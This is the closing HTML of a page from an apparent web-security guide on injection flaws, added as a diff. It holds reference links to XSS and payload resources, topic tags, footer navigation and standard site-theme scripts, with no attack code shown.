+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.74 3.74 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574M8.755 4.75l-.004 7.322a3.75 3.75 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25"/></svg></span> <strong>References</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS Cheat Sheet</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web">HackTricks — Web</a></li>
+</ul>
+</li>
+</ul>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">xss</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">sqli</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">ssti</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">command-injection</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">csrf</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">deserialization</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">bug-bounty</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../part-03-access-control/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Access Control">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Access Control
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../part-05-ssrf-xxe/" class="md-footer__link md-footer__link--next" aria-label="Next: SSRF &amp; XXE">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                SSRF & XXE
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Wellington Vumu
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+    
+  </body>
+</html>
